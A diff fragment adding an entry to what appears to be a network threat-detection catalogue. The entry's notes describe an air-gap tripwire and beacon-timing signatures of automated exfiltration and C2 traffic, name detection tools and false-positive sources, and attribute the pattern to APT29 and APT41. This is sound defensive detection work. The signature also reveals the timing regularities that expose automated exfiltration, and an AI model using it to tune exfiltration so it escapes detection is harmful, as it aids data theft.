+        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from the internal network to off-network infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Automated exfil produces highly-regular timing fingerprints: flow every 60 seconds with <5s standard deviation, flow every 5 minutes precisely, flow at exact :00 of each hour. Human users don't produce this regularity - they have variable behavior. Tools: RITA (Real Intelligence Threat Analytics) is the canonical open-source beacon detection tool, working from Zeek conn.log. Commercial NDR platforms (Corelight, ExtraHop, Vectra) include beacon detection by default. Pattern: 20+ flows from one source to one destination within an hour, with very low standard deviation in inter-arrival times. Often detected as part of C2 beacon detection (TA0011) but also applies to scheduled exfil - automated exfil tools often run on cron-like timers that produce this signature. False positives: legitimate scheduled tasks (Windows Update checks, NTP syncing, monitoring agents calling home) - build per-application baselines. After exclusions, the signature is high-confidence. Particularly important to detect because automation-driven exfil can persist for weeks before discovery if no detection layer monitors timing patterns.",
         apt: [
           { cls: "apt-ru", name: "APT29", note: "Beacon-style timing in long-term espionage operations including SolarWinds." },
           { cls: "apt-cn", name: "APT41", note: "Automated exfil patterns in sustained operations." },
